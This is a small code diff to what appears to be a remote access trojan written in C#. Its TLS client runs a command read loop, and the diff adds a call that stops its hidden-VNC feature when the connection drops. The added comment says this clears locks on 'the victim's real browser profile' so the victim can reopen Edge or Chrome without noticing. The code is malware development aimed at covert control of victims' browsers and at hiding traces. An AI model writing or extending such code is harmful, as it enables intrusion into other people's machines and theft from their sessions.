@@ -144,6 +144,10 @@ internal class TlsClient : IDisposable
 
         // Read loop - handles all incoming commands
         await ReadLoop(ct);
+
+        // Connection lost or server-initiated disconnect: stop HVNC so the victim's real
+        // browser profile locks are cleaned up and they can reopen Edge/Chrome normally.
+        HvncFeature.Stop();
     }
 
     // ── Detached process spawn via CreateProcessW ────────────────────────
